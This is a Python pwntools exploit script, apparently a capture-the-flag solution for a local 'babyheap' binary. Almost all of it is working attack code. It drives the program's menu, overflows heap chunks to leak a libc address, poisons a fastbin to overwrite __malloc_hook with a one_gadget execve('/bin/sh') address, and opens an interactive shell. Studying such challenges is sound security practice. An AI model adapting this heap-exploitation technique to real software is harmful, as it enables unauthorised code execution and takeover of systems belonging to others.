from pwn import *

# Establish the functions to interact with the program
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def fill(index, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    if size != -1:
        p.sendline(str(size))
    else:
        p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)

def free(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def dump(index):
    p.recvuntil("Command")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Content: \n")
    content = p.recvline()
    return content


env = {}
# env["LD_PRELOAD"] = "./glibc/libc.so.6"
elf = context.binary = ELF("babyheap")
p = process(env=env)
libc = elf.libc


alloc(0xf0) # 0
alloc(0x50) # 1
alloc(0xf0) # 2
alloc(0x80) # 3


free(0) 
free(1)
alloc(0x50) # 0
fill(0,-1,b"1" * 0x50 + p64(0x60 + 0x100) + p64(0x100)) 
free(2)
alloc(0xf0) # 1


p.recvuntil("Command")
p.sendline("4")
p.recvuntil("Index: ")
p.sendline(str(0))
p.recvuntil("Content: \n")
LEAK = p.recv(8) 
LEAK = u64(LEAK + b"\x00" * (8 - len(LEAK)))    
libc.address  = LEAK  - libc.sym["__malloc_hook"] - 0x68
print("LIBC: ", hex(libc.address))

# clear heap
free(3)
free(1)


alloc(0x80) # 1
alloc(0x10) # 2 
alloc(0x90) # 3 
alloc(0x80) # 4 
alloc(0x90) # 5

free(1)
free(3)
alloc(0x90) # 1 in place of 3
fill(1,-1,b"1" * 0x90 + p64(0x90 + 0x20 + 0xa0) + p64(0x90)) # overflow 1 to 4
free(4) 

alloc(0xa0) # 3
alloc(0x60) # 4 / 1
alloc(0x60) # 6
alloc(0x60) # 7

fill(4,-1,b"4" * 0x20)
fill(6,-1,b"6" * 0x20)
fill(7,-1,b"7" * 0x20)
fill(1,-1,b"1" * 0x10)

free(4)
free(6)
fill(1,-1,p64(libc.sym["__malloc_hook"] - 0x23))
free(4)

alloc(0x60) # 4
alloc(0x60) # 6
alloc(0x60) # 8

# 0x4525a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
# 
# 0xef9f4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
# 
# 0xf0897 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv

print(hex(libc.address + 0x4525a))
fill(8,-1, b"a" * 0x13 +  p64(libc.address + 0x4525a))
alloc(0x10)
# gdb.attach(p)


# why -0x23




p.interactive()
